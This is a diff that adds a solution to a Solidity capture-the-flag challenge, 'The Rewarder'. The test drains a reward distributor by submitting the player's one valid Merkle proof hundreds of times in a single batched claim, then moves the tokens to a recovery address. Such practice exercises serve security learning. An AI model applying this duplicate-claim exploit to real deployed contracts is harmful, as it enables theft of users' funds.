@@ -148,8 +148,83 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+        // Create Alice's claims
+        uint times = 867;
+        uint times2 = 853;
+        Claim[] memory claims = new Claim[](times);
+        Claim[] memory claims2 = new Claim[](times2);
+
+         // Set DVT and WETH as tokens to claim
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        Reward[] memory dvtRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/dvt-distribution.json"))), (Reward[]));
+
+
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        Reward[] memory wethRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/weth-distribution.json"))), (Reward[]));
+
+
+
+        uint256 indexDVT = findMyIndex(dvtRewards, player);
+        uint256 indexWETH = findMyIndex(wethRewards, player);
+
+        uint256 amountToClaimDVT = dvtRewards[indexDVT].amount;
+        uint256 amountToClaimWETH = wethRewards[indexWETH].amount;
+
         
+        // console.log(address(player));
+        console.log("Before", weth.balanceOf(player));
+        console.log("Before", dvt.balanceOf(player));
+        // DVT claim
+
+
+        bytes32[] memory proof = merkle.getProof(dvtLeaves, indexDVT);
+        bytes32[] memory proof2 = merkle.getProof(wethLeaves, indexWETH);
+
+
+        for (uint i = 0; i < times; i++) {
+             claims[i] = Claim({
+                batchNumber: 0, // claim corresponds to first DVT batch
+                amount: amountToClaimDVT,
+                tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                proof: proof // Alice's address is at index 2
+            });
+        }
+       
+        for (uint i = 0; i < times2; i++) {
+             // WETH claim
+                claims2[i] = Claim({
+                    batchNumber: 0, // claim corresponds to first WETH batch
+                    amount: amountToClaimWETH,
+                    tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+                    proof: proof2 // Alice's address is at index 2
+                });
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        distributor.claimRewards({inputClaims: claims2, inputTokens: tokensToClaim});
+
+
+        console.log("After", weth.balanceOf(player));
+        console.log("After", dvt.balanceOf(player));
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+
     }
+
+    function findMyIndex(Reward[] memory rewards, address user) internal pure returns (uint256) {
+    for (uint256 i = 0; i < rewards.length; i++) {
+        if (rewards[i].beneficiary == user) {
+            return i;
+        }
+    }
+    revert("Address not found in rewards");
+}
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
